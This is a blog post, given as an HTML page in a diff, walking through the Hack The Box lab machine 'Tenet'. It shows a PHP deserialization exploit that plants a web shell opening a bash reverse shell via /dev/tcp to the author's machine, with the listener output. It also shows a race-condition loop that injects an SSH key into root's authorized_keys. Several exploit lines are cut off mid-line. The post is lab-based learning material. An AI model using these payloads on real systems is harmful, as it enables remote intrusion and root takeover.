@@ -1,0 +1,797 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+<link rel="icon" href="/assets/images/logo.png">
+
+<title>Hackthebox Tenet | Razor-Sec</title>
+
+<!-- Begin Jekyll SEO tag v2.7.1 -->
+<title>Hackthebox Tenet | Razor-Sec</title>
+<meta name="generator" content="Jekyll v4.2.0" />
+<meta property="og:title" content="Hackthebox Tenet" />
+<meta name="author" content="Razor" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Introduction" />
+<meta property="og:description" content="Introduction" />
+<meta property="og:site_name" content="Razor-Sec" />
+<meta property="og:image" content="/assets/htb_tenet/bg.png" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2021-02-11T00:00:00-06:00" />
+<meta name="twitter:card" content="summary_large_image" />
+<meta property="twitter:image" content="/assets/htb_tenet/bg.png" />
+<meta property="twitter:title" content="Hackthebox Tenet" />
+<meta name="google-site-verification" content="an3WPRVUJk0x4PXH2PRpcD1vt1eBUdQhPLpgsNgamGQ" />
+<script type="application/ld+json">
+{"author":{"@type":"Person","name":"Razor"},"headline":"Hackthebox Tenet","dateModified":"2021-02-11T00:00:00-06:00","description":"Introduction","datePublished":"2021-02-11T00:00:00-06:00","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"/writeup-hackthebox-tenet/"},"publisher":{"@type":"Organization","logo":{"@type":"ImageObject","url":"/assets/images/logo.png"},"name":"Razor"},"url":"/writeup-hackthebox-tenet/","image":"/assets/htb_tenet/bg.png","@context":"https://schema.org"}</script>
+<!-- End Jekyll SEO tag -->
+
+    
+<link href="/assets/css/prism.css" rel="stylesheet">
+
+<link href="/assets/css/theme.css" rel="stylesheet">
+
+<script src="/assets/js/jquery.min.js"></script>
+
+</head>
+
+
+<!-- change your GA id in _config.yml -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-xxxxxxxx-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-xxxxxxxx-1');
+</script>
+
+
+
+<body>
+	<!-- defer loading of font and font awesome -->
+	<noscript id="deferred-styles">
+		<link href="https://fonts.googleapis.com/css?family=Sen:400,700&display=swap" rel="stylesheet">
+        <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.0.13/css/all.css" integrity="sha384-DNOHZ68U8hZfKXOrtjWvjxusGo9WQnrNx2sqG0tfsghAvtVlRW3tvkXWZh58N9jp" crossorigin="anonymous">
+	</noscript>
+
+<!-- Begin Sidebar Navigation
+================================================== -->
+
+<div class="sidebar">    
+</div>   
+<div class="nav-icon">
+    <div class="hamburger-bar"></div>
+</div>
+<div id="blackover-nav" class="blackover"></div>
+<nav id="menu">
+    <ul>
+        <h3>Navigation</h3>
+        <li><a href="/">Home</a></li>
+        <li><a href="/about">About</a></li>
+        <li><a href="/categories">Categories </a></li> 
+        <li><a href="/authors">Users </a></li>     
+        <li><a href="/contact">Contact</a></li>       
+    </ul>   
+</nav>
+
+<script src="/assets/js/lunr.js"></script>
+
+<style>
+    
+</style>
+
+<div class="wrap-search">
+    <div class="d-flex align-items-center ml-auto">
+        <i class="fas fa-search show-search"></i>
+        <form class="bd-search ml-3" onSubmit="return lunr_search(document.getElementById('lunrsearch').value);">
+            <input type="text" class="form-control bigradius text-small launch-modal-search" id="lunrsearch" name="q" maxlength="255" value="" placeholder="Type and enter..."/>
+        </form>
+    </div>
+</div>
+
+<div id="lunrsearchresults">
+    <ul></ul>
+</div>
+
+<script src="/assets/js/lunrsearchengine.js"></script>
+
+
+<!-- End Sidebar Navigation
+================================================== -->
+
+<div class="site-content ">
+
+<div class="container">
+
+    <!-- Site Logo/Name
+    ================================================== -->
+   
+    <a class="navbar-brand" href="/">
+        <img src="/assets/images/logo.png" alt="Razor-Sec">
+    </a>  
+   
+
+    <!-- Site Tag
+    ================================================== -->
+    
+
+    <!-- Content
+    ================================================== -->
+    <div class="main-content">
+        <div class="entry-header">
+    <!-- Post Title -->
+    <h1 class="posttitle">Hackthebox Tenet</h1>
+    <!-- Author & Date  Box -->
+    
+    
+    <div class="d-flex align-items-center mt-4">
+        <div>
+            
+            <img class="author-thumb" src="/assets/img/p.png" alt="Razor-Admin">
+            
+        </div>            
+        <div>
+        Written by Razor-Admin on 
+        <span class="post-date"><time class="post-date" datetime="2021-02-11">11 Feb 2021</time></span>           
+        
+        </div>            
+    </div>
+    
+</div>
+
+<!-- Adsense under title if enabled from _config.yml (change your pub id and slot) -->
+
+
+<!-- Featured Image -->
+
+<div class="entry-featured-image">
+    
+    <img class="featured-image " src="/assets/htb_tenet/bg.png" alt="Hackthebox Tenet">
+    
+</div>
+
+
+<!-- Content -->
+<!-- Post, Page Content
+================================================== -->
+<div class="article-post">
+    <!-- Toc if any -->
+    
+    
+    <div class="toc mt-4 mb-4 lead">
+        <h3 class="font-weight-bold">Summary</h3>
+        <ul>
+  <li><a href="#introduction">Introduction</a></li>
+  <li><a href="#enumeration">Enumeration</a>
+    <ul>
+      <li><a href="#nmap">Nmap</a></li>
+    </ul>
+  </li>
+  <li><a href="#exploit">Exploit</a>
+    <ul>
+      <li><a href="#user">User</a></li>
+      <li><a href="#privilage-escalation">Privilage Escalation</a></li>
+    </ul>
+  </li>
+</ul>
+    </div>
+    
+    <!-- End Toc -->
+    <h2 id="introduction">Introduction</h2>
+
+<p>The tenet machine of Hackthebox is an active machine. here we will learn a lot about RCE in php and other privileges. I suggest you read all of these writeups to understand what’s going on here. you can join this room in <a href="https://www.hackthebox.eu/home/machines/profile/309">here</a></p>
+
+<h2 id="enumeration">Enumeration</h2>
+
+<h3 id="nmap">Nmap</h3>
+<p>first we must scanning the machine :</p>
+<pre><code>$ sudo nmap -sC -sV 10.10.10.223  
+
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-11 21:56 WIB
+Nmap scan report for tenet.htb (10.10.10.223)
+Host is up (0.020s latency).
+Not shown: 998 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 cc:ca:43:d4:4c:e7:4e:bf:26:f4:27:ea:b8:75:a8:f8 (RSA)
+|   256 85:f3:ac:ba:1a:6a:03:59:e2:7e:86:47:e7:3e:3c:00 (ECDSA)
+|_  256 e7:e9:9a:dd:c3:4a:2f:7a:e1:e0:5d:a2:b0:ca:44:a8 (ED25519)
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-generator: WordPress 5.6
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: Tenet
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 8.81 seconds
+</code></pre>
+
+<p>Thats only 2 port open. now lets put tenet.htb to /etc/hosts and see what happen.</p>
+<pre><code>$ sudo nano /etc/hosts
+
+127.0.0.1       localhost
+127.0.1.1       Razor
+
+10.10.10.223 tenet.htb
+
+# The following lines are desirable for IPv6 capable hosts
+::1     localhost ip6-localhost ip6-loopback
+ff02::1 ip6-allnodes
+ff02::2 ip6-allrouters
+</code></pre>
+<p>now after that lets jump to webserver : http://tenet.htb</p>
+
+<p><img src="/assets/htb_tenet/bg_1.png" alt="image" /></p>
+
+<p>After I looking around on the website I found a comment on the migration tab which gives us a hint, namely “The sator php”, let’s try inputting Sator into a subdomain and looking for the sator.php file:</p>
+
+<pre><code>sudo nano /etc/hosts
+
+127.0.0.1       localhost
+127.0.1.1       Razor
+
+10.10.10.223 tenet.htb sator.tenet.htb
+
+# The following lines are desirable for IPv6 capable hosts
+::1     localhost ip6-localhost ip6-loopback
+ff02::1 ip6-allnodes
+ff02::2 ip6-allrouters
+</code></pre>
+<p>and thats right, subdomain is working but its just only default webpage from apache.</p>
+
+<p><img src="/assets/htb_tenet/bg_2.png" alt="image" /></p>
+
+<p>Lets put sator.php on this subdomain :</p>
+
+<p><img src="/assets/htb_tenet/bg_3.png" alt="image" /></p>
+
+<p>now you can grab php with add extension .bak and we can analysis :</p>
+
+<p><img src="/assets/htb_tenet/bg_4.png" alt="image" /></p>
+
+<p>There is the code :</p>
+<pre><code class="language-bat">&lt;?php
+
+class DatabaseExport
+{
+        public $user_file = 'users.txt';
+        public $data = '';
+
+        public function update_db()
+        {
+                echo '[+] Grabbing users from text file &lt;br&gt;';
+                $this-&gt; data = 'Success';
+        }
+
+
+        public function __destruct()
+        {
+                file_put_contents(__DIR__ . '/' . $this -&gt;user_file, $this-&gt;data);
+                echo '[] Database updated &lt;br&gt;';
+        //      echo 'Gotta get this working properly...';
+        }
+}
+
+$input = $_GET['arepo'] ?? '';
+$databaseupdate = unserialize($input);
+
+$app = new DatabaseExport;
+$app -&gt; update_db();
+
+
+?&gt;
+</code></pre>
+<h2 id="exploit">Exploit</h2>
+
+<p>after searchings i found insecure php serialization payload, you can see at <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Insecure%20Deserialization/Files/PHP-Serialization-RCE-Exploit.php">here</a></p>
+
+<p>and i’m modification that to this :</p>
+
+<pre><code class="language-bat">&lt;?php
+class DatabaseExport
+{
+        public $user_file = 'razor-exploit.php';
+                                               
+        public $data = '&lt;?php exec("/bin/bash -c \'bash -i &gt; /dev/tcp/10.10.14.4&gt;
+        public function __destruct()
+        {
+                file_put_contents(__DIR__ . '/' . $this -&gt;user_file, $this-&gt;data&gt;
+                echo '[Anjay abang ganteng lagi exploit code nya nich]';
+        }
+}
+$url = 'http://10.10.10.223/sator.php?arepo=' . urlencode(serialize(new Database&gt;
+$response = file_get_contents("$url");
+$response = file_get_contents("http://10.10.10.223/razor-exploit.php");
+?&gt;
+</code></pre>
+<p>In Hacker command : ` nc -lvnp 4444 `
+then run command : ` php razor.php `</p>
+
+<pre><code>$ php back.php     
+[Anjay abang ganteng lagi exploit code nya nich]PHP Warning:
+
+</code></pre>
+<pre><code>nc -lvnp 4444
+listening on [any] 4444 ...
+connect to [10.10.14.4] from (UNKNOWN) [10.10.10.223] 34284
+id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+</code></pre>
+<p>then we are connected to shell webserver</p>
+
+<h3 id="user">User</h3>
+
+<p>After looking around i found wp-config which is contain credential of user :</p>
+
+<p><img src="/assets/htb_tenet/bg_5.png" alt="image" /></p>
+
+<pre><code>neil@tenet:/var/www/html/wordpress$ id
+uid=1001(neil) gid=1001(neil) groups=1001(neil)
+neil@tenet:/var/www/html/wordpress$ cd /home/neil/
+neil@tenet:~$ ls
+user.txt
+neil@tenet:~$ cat user.txt 
+6a9d38459e130f9f9a0c56958f96a1a1
+neil@tenet:~$ 
+</code></pre>
+<p>We got user.txt</p>
+
+<h3 id="privilage-escalation">Privilage Escalation</h3>
+
+<p>lets look privilage of user neil :</p>
+
+<pre><code>neil@tenet:~$ sudo -l
+Matching Defaults entries for neil on tenet:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:
+
+User neil may run the following commands on tenet:
+    (ALL : ALL) NOPASSWD: /usr/local/bin/enableSSH.sh
+</code></pre>
+<p>we have to access : /usr/local/bin/enableSSH.sh</p>
+<pre><code class="language-bat">neil@tenet:~$ cat /usr/local/bin/enableSSH.sh
+#!/bin/bash
+
+checkAdded() {
+
+        sshName=$(/bin/echo $key | /usr/bin/cut -d " " -f 3)
+        if [[ ! -z $(/bin/grep $sshName /root/.ssh/authorized_keys) ]]; then
+                /bin/echo "Successfully added $sshName to authorized_keys file!"
+        else
+                /bin/echo "Error in adding $sshName to authorized_keys file!"
+        fi
+
+}
+
+checkFile() {
+
+        if [[ ! -s $1 ]] || [[ ! -f $1 ]]; then
+                /bin/echo "Error in creating key file!"
+
+                if [[ -f $1 ]]; then /bin/rm $1; fi
+
+                exit 1
+        fi
+}
+
+addKey() {
+
+        tmpName=$(mktemp -u /tmp/ssh-XXXXXXXX)
+
+        (umask 110; touch $tmpName)
+
+        /bin/echo $key &gt;&gt;$tmpName
+
+        checkFile $tmpName
+
+        /bin/cat $tmpName &gt;&gt;/root/.ssh/authorized_keys
+
+        /bin/rm $tmpName
+
+}
+
+</code></pre>
+<p>from thats script we can inject to getting root.</p>
+<ul>
+  <li>first create id_rsa on your machine ` ssh-keygen `</li>
+  <li>then create script like this :
+    <pre><code class="language-bat">while true
+do 
+echo ' put id_rsa.pub' |tee /tmp/ssh-*
+done
+</code></pre>
+  </li>
+  <li>then put id_rsa.pub to script
+    <pre><code class="language-bat">while true
+do 
+echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCuC30kS7Gb89F8nYQetIKn6mgjGSA5nmX8fn3WQ2Gim+iBJPTmeIF6skdkM4z8//gejqC9RP5TkkuOIhxPcbI5i8Jz5lF2DbvLeUSJp2OfVQuI4DxmHTGwzMvIA40hkYSvwvgYErJAfZLLOuNyMOH6s4g6Ng970947N9P1094Z1fzavO4ahYHrM9Uyje6ceUIBstZe4Ma57Rgi3FCV8tmUkmS/gskWo1cR2pTmtucvsP8rGB2+X86y/pLkd3iipX4k2DhOCeSH894roy6uLB0+EEg3pRo2Ge0IOym0KI5o11gt0JS3hwF9I2REwODyolH5j/lZBtngDag2oCC5KqWVJGd6yha+nCmZWwifckFEpNbfNA0L3gSxpQJ5aE/xKJZffcMPfMdBHZzoz2q53XKmBUhXKeORsU42KiV+CbPxinz6OjXcSsIpw3IB/99HpoMW2tFZKLZYZVcM9vWjCg7Q2CJZUgPrwNBBSTi3LlFzSkmPsQXxclDA21fPnBmip1c=' |tee /tmp/ssh-*
+done
+</code></pre>
+  </li>
+  <li>chmod 600 to id_rsa</li>
+  <li>then run the scipt ./looping.sh</li>
+  <li>script will still looping, we can leave that alone and log in again at a different term</li>
+  <li>in second term run this “ sudo /usr/local/bin/enableSSH.sh “ for 4 times</li>
+  <li>and we connect in hacker machines :
+    <pre><code>ssh -i id_rsa root@10.10.10.223
+</code></pre>
+    <p><img src="/assets/htb_tenet/bg_root.png" alt="image" /></p>
+  </li>
+</ul>
+
+<p>if thats doesn’t work you can reply again until it works</p>
+
+<p>Happy hacking :D</p>
+
+</div>
+
+<!-- Rating -->
+
+
+<!-- Author Box if enabled from _config.yml -->
+<!-- Author Box -->
+
+
+<div class="authorbox mb-5 mt-5 pt-4 pb-4">   
+    <div class="row">
+        <div class="wrapavname col-md-3 text-center">
+            
+            <img  class="author-thumb" src="/assets/img/p.png" alt="Razor-Admin">
+            
+            <p class="mt-4 mb-0 small text-center">
+                <a target="_blank" class="d-inline-block mx-1 text-dark" href="https://www.wowthemes.net/donate/"><i class="fa fa-link"></i></a> 
+                <a target="_blank" class="d-inline-block mx-1 text-dark" href="https://twitter.com/0xRxd"><i class="fab fa-twitter"></i></a>
+                <a class="d-inline-block mx-1 text-dark" href="mailto:markoyanfyan12@gmail.com"><i class="fa fa-envelope"></i></a>
+            </p>
+        </div>
+        <div class="col-md-9">
+            <h4>Razor-Admin</h4>
+            <p class="mt-3 mb-0">Author of Razor-Sec, And i'm learner, Cyber Security Enthusias, DevOps, SysOps</p>
+        </div>
+    </div> 
+</div> 
+
+
+
+<!-- Comments if not disabled with comments: false -->
+<!-- Comments
+================================================== -->
+ 
+<div class="comments mt-5">
+    <button class="btn btn-outline-dark py-2 px-5 d-block w-100 show-comments"><i class="fa fa-comments text-muted"></i> &nbsp; Load Comments</button>         
+    <div id="comments">  
+        <h4 class="mb-4">Comments</h4>                 
+            <section class="disqus">
+    <div id="disqus_thread"></div>
+    <script type="text/javascript">
+        var disqus_shortname = 'Demo-RazorSec'; 
+        var disqus_developer = 0;
+        (function() {
+            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+            dsq.src = window.location.protocol + '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        })();
+    </script>
+    <noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+    <a href="http://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+</section>
+     
+    <div class="clearfix"></div>              
+    </div>    
+</div>       
+
+
+<!-- Share -->
+<div class="share">
+    <p>
+        Share
+    </p>
+    <ul>
+        <li class="ml-1 mr-1">
+            <a target="_blank" href="https://twitter.com/intent/tweet?text=Hackthebox Tenet&url=/writeup-hackthebox-tenet/" onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
+                <i class="fab fa-twitter"></i>
+            </a>
+        </li>
+
+        <li class="ml-1 mr-1">
+            <a target="_blank" href="https://facebook.com/sharer.php?u=/writeup-hackthebox-tenet/" onclick="window.open(this.href, 'facebook-share', 'width=550,height=435');return false;">
+                <i class="fab fa-facebook-f"></i>
+            </a>
+        </li>
+
+        <li class="ml-1 mr-1">
+            <a target="_blank" href="https://www.linkedin.com/shareArticle?mini=true&url=/writeup-hackthebox-tenet/" onclick="window.open(this.href, 'width=550,height=435');return false;">
+                <i class="fab fa-linkedin-in"></i>
+            </a>
+        </li>
+
+    </ul>
+</div>
+
+
+<!-- Related Post -->
+<!-- Related Posts
+================================================== -->
+<div class=" related-posts ">  
+
+    
+    <h2 class="text-center mb-4">Explore more like this</h2>
+    
+    
+    <div class="d-flex justify-content-center align-items-center">
+    
+    <!-- Categories -->
+    
+    
+    <a class="smoothscroll badge badge-primary text-capitalize" href="/categories#Hackthebox">Hackthebox</a>                
+    
+    <a class="smoothscroll badge badge-primary text-capitalize" href="/categories#Linux">Linux</a>                
+    
+
+    <!-- Tags -->  
+    
+                    
+    <a class="smoothscroll badge badge-primary text-capitalize" href="/tags#boot2root">boot2root</a>               
+                    
+    <a class="smoothscroll badge badge-primary text-capitalize" href="/tags#cve">cve</a>               
+                    
+    <a class="smoothscroll badge badge-primary text-capitalize" href="/tags#enumeration">enumeration</a>               
+                    
+    <a class="smoothscroll badge badge-primary text-capitalize" href="/tags#medium-box">medium-box</a>               
+                    
+    <a class="smoothscroll badge badge-primary text-capitalize" href="/tags#privilage-escalation">privilage escalation</a>               
+                    
+    <a class="smoothscroll badge badge-primary text-capitalize" href="/tags#rce-php">rce php</a>               
+                    
+    <a class="smoothscroll badge badge-primary text-capitalize" href="/tags#web-exploitation">web exploitation</a>               
+    
+
+    </div>
+
+    
+    
+    
+    <div class="blog-grid-container">
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+            <!-- begin post -->
+
+
+<div class="blog-grid-item">
+    <div class="card h-100">
+        <div class="maxthumb">
+            <a href="/writeup-vulnhub-loly/">
+                
+
+                    
+                        <img class="img-thumb" src="/assets/vulnhub_loly/bg.png" alt="Loly Writeup"> 
+                    
+
+                
+            </a>
+        </div>
+        <div class="card-body">
+            <h2 class="card-title">
+                <a class="text-dark" href="/writeup-vulnhub-loly/">Loly Writeup</a>
+                
+            </h2>
+            <h4 class="card-text">Introduction
+</h4>
+        </div>
+        <div class="card-footer bg-white">
+            <div class="wrapfooter">
+                
+                <span class="meta-footer-thumb">
+                
+                <img class="author-thumb" src="/assets/img/p.png" alt="Razor-Admin">
+                
+                </span>
+                <span class="author-meta">
+                <span class="post-name font-weight-bold">Razor-Admin</span> 
+                
+                <span class="post-date">02 Mar 2021</span>
+                </span>
+                <div class="clearfix"></div>
+            </div>
+        </div>
+    </div>
+</div>
+<!-- end post -->
+            
+            
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+            <!-- begin post -->
+
+
+<div class="blog-grid-item">
+    <div class="card h-100">
+        <div class="maxthumb">
+            <a href="/writeup-tryhackme-CVE-SUDOERS/">
+                
+
+                    
+                        <img class="img-thumb" src="/assets/thm_lunizzctf/bg.png" alt="Tryhackme LunizzCTF (CVE SUDOERS)"> 
+                    
+
+                
+            </a>
+        </div>
+        <div class="card-body">
+            <h2 class="card-title">
+                <a class="text-dark" href="/writeup-tryhackme-CVE-SUDOERS/">Tryhackme LunizzCTF (CVE SUDOERS)</a>
+                
+            </h2>
+            <h4 class="card-text">Introduction This is partical room from tryhackme entitled LunizzCTF with Medium difficulty, but In this Case i want to implement cve sudoers (CVE-2021-3156). In this room we will learn about...</h4>
+        </div>
+        <div class="card-footer bg-white">
+            <div class="wrapfooter">
+                
+                <span class="meta-footer-thumb">
+                
+                <img class="author-thumb" src="/assets/img/p.png" alt="Razor-Admin">
+                
+                </span>
+                <span class="author-meta">
+                <span class="post-name font-weight-bold">Razor-Admin</span> 
+                
+                <span class="post-date">01 Mar 2021</span>
+                </span>
+                <div class="clearfix"></div>
+            </div>
+        </div>
+    </div>
+</div>
+<!-- end post -->
+            
+            
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+            <!-- begin post -->
+
+
+<div class="blog-grid-item">
+    <div class="card h-100">
+        <div class="maxthumb">
+            <a href="/writeup-vulnhub-pwned1/">
+                
+
+                    
+                        <img class="img-thumb" src="/assets/vulnhub_pwned1/bg.png" alt="Pwned1 Writeup"> 
+                    
+
+                
+            </a>
+        </div>
+        <div class="card-body">
+            <h2 class="card-title">
+                <a class="text-dark" href="/writeup-vulnhub-pwned1/">Pwned1 Writeup</a>
+                
+            </h2>
+            <h4 class="card-text">Introduction This is partical room from tryhackme entitled “Pwned1” form vulnhub. Difficulty of This box is Intermediate and in this box you will learn all about Fuzzing diretory, Custom exploitation,...</h4>
+        </div>
+        <div class="card-footer bg-white">
+            <div class="wrapfooter">
+                
+                <span class="meta-footer-thumb">
+                
+                <img class="author-thumb" src="/assets/img/p.png" alt="Razor-Admin">
+                
+                </span>
+                <span class="author-meta">
+                <span class="post-name font-weight-bold">Razor-Admin</span> 
+                
+                <span class="post-date">28 Feb 2021</span>
+                </span>
+                <div class="clearfix"></div>
+            </div>
+        </div>
+    </div>
+</div>
+<!-- end post -->
+            
+            
+                
+        </div>        
+</div>
+
+<!-- Review with LD-JSON, adapt it for your needs if you like, but make sure you test the generated HTML source code first: 
+https://search.google.com/structured-data/testing-tool/u/0/
+================================================== -->
+
+    </div>
+
+    
+    <!-- Newsletter
+    ================================================== -->
+    <div class="newsletter text-center">
+        <span class="h4"><img src="/assets/images/logo.png" class="newsletter-logo" alt="Razor-Sec"> &nbsp; Never miss a <b>story</b> from us, subscribe to our newsletter</span>
+        <form action="https://wowthemes.us11.list-manage.com/subscribe/post?u=8aeb20a530e124561927d3bd8&amp;id=8c3d2d214b" method="post" name="mc-embedded-subscribe-form" class="wj-contact-form validate" target="_blank" novalidate>
+            <div class="mc-field-group d-inline-flex">
+            <input type="email" placeholder="Your e-mail" name="EMAIL" class="required email" id="mce-EMAIL" autocomplete="on" required>
+            <input type="submit" value="Subscribe" name="subscribe" class="heart">
+            </div>
+        </form>
+    </div>
+    
+    
+</div>
+
+<!-- Begin Footer
+================================================== -->
+<footer class="footer">
+    <div class="container">
+        <div class="row">
+            <div class="col-md-6 col-sm-12 text-center text-lg-left">
+                Copyright © 2022 Razor-Sec 
+            </div>
+            <div class="col-md-6 col-sm-12 text-center text-lg-right">    
+                Created by <a target="_blank" href="">Razor-Sec </a> 
+            </div>
+        </div>
+    </div>
+</footer>
+<!-- End Footer
+================================================== -->
+
+</div> <!-- /.site-content -->
+
+<!-- Scripts (if you need bootstrap.js, please add it yourself. I didn't use it for performance reasons, it was not needed in this theme)
+================================================== -->
+
+<script src="/assets/js/prism.js"></script>
+
+<script src="/assets/js/theme.js"></script>
+
+
+
+
+<script id="dsq-count-scr" src="//Demo-RazorSec.disqus.com/count.js"></script>
+
+
+</body>
+</html>
